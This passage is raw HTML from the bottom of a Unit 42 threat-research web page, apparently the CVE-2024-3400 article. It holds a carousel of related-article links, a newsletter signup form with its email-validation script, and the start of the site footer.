                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/packer-as-a-service-heartcrypt-malware/" title="Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/04_Vulnerabilities_1920x900-786x368.jpg" class="lozad" alt="Pictorial representation of suspicious registration scam campaigns. Close-up image of a glowing red WiFi connectivity symbol on a textured black surface, symbolizing digital security technology." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/04_Vulnerabilities_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/04_Vulnerabilities_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/04_Vulnerabilities_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/04_Vulnerabilities_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/04_Vulnerabilities_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2024-12-06T23:00:40+00:00">December 6, 2024</time></span>
                  <a href="https://unit42.paloaltonetworks.com/suspicious-domain-registration-campaigns/" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams">
                    <h4 class="post-title">Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/network-scanning/" title="network scanning" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams:network scanning">Network scanning</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/cybersquatting/" title="cybersquatting" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams:cybersquatting">Cybersquatting</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/chatgpt/" title="ChatGPT" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams:ChatGPT">ChatGPT</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/suspicious-domain-registration-campaigns/" title="Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/07_Vulnerabilities_1920x900-786x368.jpg" class="lozad" alt="Pictorial representation of vulnerabilities such as CVE-2024-0012 and CVE-2024-9474. A panoramic nighttime view of city skyline with illuminated high-rise buildings and vibrant lights." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/07_Vulnerabilities_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/07_Vulnerabilities_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/07_Vulnerabilities_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/07_Vulnerabilities_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/07_Vulnerabilities_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/top-cyberthreats/" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Threat Brief: Operation Lunar Peek, Activity Related to CVE-2024-0012 and CVE-2024-9474 (Updated Nov. 22):High Profile Threats"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/07/top-threats.svg" alt=" category icon">High Profile Threats</span></a>                        <span class="post-pub-date"><time datetime="2024-11-22T11:21:18+00:00">November 22, 2024</time></span>
                  <a href="https://unit42.paloaltonetworks.com/cve-2024-0012-cve-2024-9474/" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Threat Brief: Operation Lunar Peek, Activity Related to CVE-2024-0012 and CVE-2024-9474 (Updated Nov. 22)">
                    <h4 class="post-title">Threat Brief: Operation Lunar Peek, Activity Related to CVE-2024-0012 and CVE-2024-9474 (Updated Nov. 22)</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/pan-os/" title="PAN-OS" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Threat Brief: Operation Lunar Peek, Activity Related to CVE-2024-0012 and CVE-2024-9474 (Updated Nov. 22):PAN-OS">PAN-OS</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/cve-2024-0012-cve-2024-9474/" title="Threat Brief: Operation Lunar Peek, Activity Related to CVE-2024-0012 and CVE-2024-9474 (Updated Nov. 22)" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Threat Brief: Operation Lunar Peek, Activity Related to CVE-2024-0012 and CVE-2024-9474 (Updated Nov. 22):read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/12_Security-Technology_Category_1920x900-786x368.jpg" class="lozad" alt="Close-up of a person wearing glasses, reflecting computer code on the lens." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/12_Security-Technology_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/12_Security-Technology_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/12_Security-Technology_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/12_Security-Technology_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/12_Security-Technology_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2024-11-22T11:00:26+00:00">November 22, 2024</time></span>
                  <a href="https://unit42.paloaltonetworks.com/unique-popular-techniques-lateral-movement-macos/" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples">
                    <h4 class="post-title">Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/remote-code-execution/" title="Remote Code Execution" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples:Remote Code Execution">Remote Code Execution</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/python/" title="Python" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples:Python">Python</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/macos/" title="macOS" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples:macOS">MacOS</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/unique-popular-techniques-lateral-movement-macos/" title="Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/02_Malware_Category_1920x900-786x368.jpg" class="lozad" alt="Pictorial representation of FrostyGoop malware. Close-up view of a digital screen displaying a pixelated, abstract image, possibly representing a face." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/02_Malware_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/02_Malware_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/02_Malware_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/02_Malware_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/02_Malware_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2024-11-19T11:00:15+00:00">November 19, 2024</time></span>
                  <a href="https://unit42.paloaltonetworks.com/frostygoop-malware-analysis/" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications">
                    <h4 class="post-title">FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/bustleberm/" title="BUSTLEBERM" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications:BUSTLEBERM">BUSTLEBERM</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/frostygoop/" title="FrostyGoop" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications:FrostyGoop">FrostyGoop</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/go/" title="Go" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications:Go">Go</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/frostygoop-malware-analysis/" title="FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/05_Malware_Category_1920x900-786x368.jpg" class="lozad" alt="Pictorial representation of a threat like the Bring Your Own Vulnerable Driver (BYOVD) technique. Image of computer code on a screen with a prominent biohazard symbol." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/05_Malware_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/05_Malware_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/05_Malware_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/05_Malware_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/05_Malware_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:TA Phone Home: EDR Evasion Testing Reveals Extortion Actor&#039;s Toolkit:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2024-11-01T22:00:12+00:00">November 1, 2024</time></span>
                  <a href="https://unit42.paloaltonetworks.com/edr-bypass-extortion-attempt-thwarted/" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:TA Phone Home: EDR Evasion Testing Reveals Extortion Actor&#039;s Toolkit">
                    <h4 class="post-title">TA Phone Home: EDR Evasion Testing Reveals Extortion Actor's Toolkit</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/extortion/" title="Extortion" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:TA Phone Home: EDR Evasion Testing Reveals Extortion Actor&#039;s Toolkit:Extortion">Extortion</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/data-exfiltration/" title="data exfiltration" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:TA Phone Home: EDR Evasion Testing Reveals Extortion Actor&#039;s Toolkit:data exfiltration">Data exfiltration</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/edr-bypass-extortion-attempt-thwarted/" title="TA Phone Home: EDR Evasion Testing Reveals Extortion Actor&#039;s Toolkit" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:TA Phone Home: EDR Evasion Testing Reveals Extortion Actor&#039;s Toolkit:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/10/03_Security-Technology_Category_1920x900-786x368.jpg" class="lozad" alt="A pictorial representation of jailbreaking a large language model. A glowing cube with the letters &quot;AI&quot; illuminated in blue, surrounded by a network of interconnected circuits and data lines, representing artificial intelligence technology." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/10/03_Security-Technology_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/10/03_Security-Technology_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/10/03_Security-Technology_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/10/03_Security-Technology_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/10/03_Security-Technology_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Deceptive Delight: Jailbreak LLMs Through Camouflage and Distraction:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2024-10-23T10:00:55+00:00">October 23, 2024</time></span>
                  <a href="https://unit42.paloaltonetworks.com/jailbreak-llms-through-camouflage-distraction/" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Deceptive Delight: Jailbreak LLMs Through Camouflage and Distraction">
                    <h4 class="post-title">Deceptive Delight: Jailbreak LLMs Through Camouflage and Distraction</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/jailbroken/" title="jailbroken" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Deceptive Delight: Jailbreak LLMs Through Camouflage and Distraction:jailbroken">Jailbroken</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/llm/" title="LLM" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Deceptive Delight: Jailbreak LLMs Through Camouflage and Distraction:LLM">LLM</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/genai/" title="GenAI" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Deceptive Delight: Jailbreak LLMs Through Camouflage and Distraction:GenAI">GenAI</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/jailbreak-llms-through-camouflage-distraction/" title="Deceptive Delight: Jailbreak LLMs Through Camouflage and Distraction" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Deceptive Delight: Jailbreak LLMs Through Camouflage and Distraction:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                    </div>
    </div>
    <div class="l-container bs__controls">
      <div class="bs__progress"><span></span></div>
      <div class="bs__navigation"> 
        <ul>
          <li> 
            <button id="prevButton"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/slider-arrow-left.svg" alt="Slider arrow"></button>
          </li>
          <li> 
            <button id="nextButton"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/slider-arrow-left.svg" alt="Slider arrow"></button>
          </li>
        </ul>
      </div>
    </div>
  </div>
 
        <div class="be-enlarge-modal" id="enlargedModal">
          <div class="be-enlarge-modal__wrapper"> 
            <figure> 
              <button class="close__modal" id="closeModal"> 
              <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/close-modal.svg" alt="Close button"></button>
              <img class="be__enlarged-image" id="enlargedImage" src="" alt="Enlarged Image">
              <figcaption> </figcaption>
            </figure>
          </div>
        </div>

      </div>
    </section>
  </main>
<!--  Start: Footer subscription form -->
<div class="newsletter">
      <div class="l-container">
        <div class="newsletter__wrapper">
          <div class="image__wrapper"> 
            <picture>
			                 <source class="lozad" media="(max-width:400px)" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/newsletter-Image-mobile.webp">
			  			                  <source class="lozad" media="(max-width:949px)" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/newsletter-Image-tab.webp">
			  			  			  	<img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/Revitalized_newsletter-Image-desktop-copy-1.webp" alt="Newsletter">
			              </picture>
          </div>
          <div class="content__wrapper"> 
		    							<span class="pre-title"> 
				<img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/palo-alto-logo-small.svg" alt="UNIT 42 Small Logo">
				Get updates from Unit 42			</span>
						           	 <h2>Peace of mind comes from staying ahead of threats. Contact us today.</h2>
			            <form action="https://www.paloaltonetworks.com/apps/pan/public/formsubmithandler.submitform.json" method="post" novalidate class="subscribe-form" name="Unit42_Subscribe" id="unit42footerSubscription_form">
              <input type="hidden" name="emailFormMask" value="">
              <input type="hidden" value="1086" name="formid">
              <input type="hidden" value="531-OCS-018" name="munchkinId">
              <input type="hidden" value="2141" name="lpId">
              <input type="hidden" value="1203" name="programId">
              <input type="hidden" value="1086" name="formVid">
              <input type="hidden" name="mkto_optinunit42" value="true">
              <input type="hidden" name="mkto_opt-in" value="true">
              <div class="form-group"> 
                <label for="newsletter-email"  id="newsletter-email-label">Your Email</label>
                <input type="emal" placeholder="Your Email" name="Email"  class="subscribe-field" id="newsletter-email" aria-labelledby="newsletter-email-label">
                <p class="error-mail mb-15 text-danger" style="color: #dc3545"></p>
				<p>Subscribe for email updates to all Unit 42 threat research.<br />By submitting this form, you agree to our <a title="Terms of Use" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use" data-page-track="true" data-page-track-value="Get updates from Unit 42:Terms of Use">Terms of Use</a> and acknowledge our <a title="Privacy Statement" href="https://www.paloaltonetworks.com/legal-notices/privacy" data-page-track="true" data-page-track-value="Get updates from Unit 42:Privacy Statement">Privacy Statement.</a></p>
                <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6Lc5EhgTAAAAAJa-DzE7EeWABasWg4LKv-R3ao6o"></div>
                <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Invalid captcha!</p>
                <button class="l-btn is-disabled" data-page-track="true" data-page-track-value="footer:Get updates from Unit 42:Subscribe" id="unit42footerSubscription_form_button"> 
					Subscribe					<img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/right-arrow.svg" alt="Right Arrow"  class="arrow">
					<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-loader.svg" alt="loader" class="loader">
			   </button>
				<div class="form-success-message"></div>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>

<script>

(function($) {
	// Migrated from the unit42-v5 + Modifications
	var subscribeSuccess = false;
	var email = document.getElementById('newsletter-email');
	var subscription_form = document.getElementById('unit42footerSubscription_form');
	var subscription_form_button = document.getElementById('unit42footerSubscription_form_button');
	window.captchaComplete = function() {
		subscribeSuccess = true;
		if ($(mail).val() != '' && isEmail($(mail).val())) {
			$(subscription_form_button).removeClass('is-disabled');
		}
		setTimeout(function() {
			$(email).focus();
			$('.g-recaptcha iframe').attr('tabindex', '-1');
		}, 100)
	}
	window.captchaExpires = function() {
		subscribeSuccess = false;
		$(subscription_form_button).addClass('is-disabled', true);
	} 
	$(subscription_form).submit(function(e) {
		e.preventDefault();
		e.stopImmediatePropagation();
		updateEmailMask();
		var success = true;
		var form = $(this);
		var mail = form.find('input[name="Email"]');
		
		if (mail.val() === '') {
			mail.addClass('has-error');
			showError(1);
			success = false;	
		}  else if (!isEmail(mail.val())){
			showError(2);
			success = false;
		}
		else {
			mail.removeClass('has-error');
			$('.error-mail').addClass('d-none');
		}

		if (!subscribeSuccess) {
			$('.error-recaptcha').removeClass('d-none');
		} else {
			$('.error-recaptcha').addClass('d-none');
		}

		if (success && subscribeSuccess) {
			$.ajax({
				type: 'POST',
				url: form.attr('action'),
				data: form.serialize(),
				beforeSend: function() {
                 form.find('button').addClass('is-loading');
    			},
				success: function(msg) {
					form.find('.form-success-message').html('<p class="success-message">You have been successfully subscribed</p>');
					form.find('button').removeClass('is-loading');
					$(email).val('');
					clearError();
				},
				error: function(jqXHR, textStatus, errorThrown) {
					$(subscription_form_button).addClass('is-disabled', true);
					form.find('button').removeClass('is-loading');
					
				}
			});
		}
		return false;
	});
	function showError(error_type){
		if(error_type == 1) {
			$('.error-mail').text("Please enter the email address.").addClass('error-show');
			$(subscription_form_button).addClass('is-disabled');
		} else if(error_type == 2){
			$('.error-mail').text("Please provide a valid e-mail address.").addClass('error-show');
			$(subscription_form_button).addClass('is-disabled');
		}	
		$(subscription_form_button).removeClass('is-loading');
	}
	function clearError(){
		$('.error-mail').text("").removeClass('error-show');;
		$(subscription_form_button).removeClass('is-loading');
		$(subscription_form_button).removeClass('is-disabled');
	}
	
	$(email).on('input', function (event) { 
		var email = $(this).val();
		if (isEmail(email) ) {			
			clearError();
		} else if(email == ""){
			clearError();
		} else{
			showError(2);			  
		}
    });

	function isEmail(email) {
		var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
		return re.test(String(email).toLowerCase());
	}
	
	var captcha_loaded = false;
         if(!captcha_loaded){
            // recaptcha on foucs call
            $(document).on('change paste keyup', '#newsletter-email', function () {
               if($('.g-recaptcha').hasClass('d-none')){
                $('.g-recaptcha').removeClass('d-none');
               }
               if(!captcha_loaded ){
                  captcha_loaded  = true;
                  // trigger loading api.js (recaptcha.js) script
                  var head = document.getElementsByTagName('head')[0];
                  var script = document.createElement('script');
                  script.type = 'text/javascript';
                  script.src = 'https://www.google.com/recaptcha/api.js?hl=en_US';
                  head.appendChild(script);
               }
            });
        }
	
	function updateEmailMask() {
		var email = $("#unit42footerSubscription_form input[name='Email']").val();
		if (email && email.trim() != '') {
			var maskedEmail = maskEmailAddress(email);
			$("#unit42footerSubscription_form input[name='emailFormMask']").val(maskedEmail);
		}
	}

	function maskEmailAddress (emailAddress) {
		function mask(str) {
			var strLen = str.length;
			if (strLen > 4) {
				return str.substr(0, 1) + str.substr(1, strLen - 1).replace(/\w/g, '*') + str.substr(-1,1);
			}
			return str.replace(/\w/g, '*');
		}
		return emailAddress.replace(/([\w.]+)@([\w.]+)(\.[\w.]+)/g, function (m, p1, p2, p3) {
			return mask(p1) + '@' + mask(p2) + p3;
		});

		return emailAddress;
	}

}(jQuery));
//# sourceMappingURL=main.js.map
	
</script>
<!--  End: Footer subscription form -->

<footer class="footer"> 
  <div class="footer-menu">
    <div class="l-container">
      <div class="footer-menu__wrapper">
        <div class="footer-menu-nav__wrapper">
                      <h3 class="footer-menu-nav__title">Products and services</h3>
                                <div class="nav-column__wrapper"> 
            <div class="nav-column">
              													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/network-security"   role="link" title="Network Security Platform" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform">Network Security Platform</a>
						</li>    
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/network-security/security-subscriptions"   role="link" title="CLOUD DELIVERED SECURITY SERVICES" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES">CLOUD DELIVERED SECURITY SERVICES</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/advanced-threat-prevention" target=_blank  role="link" title="Advanced Threat Prevention" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention">Advanced Threat Prevention</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/advanced-dns-security"   role="link" title="DNS Security" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security">DNS Security</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/enterprise-data-loss-prevention"   role="link" title="Data Loss Prevention" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention">Data Loss Prevention</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
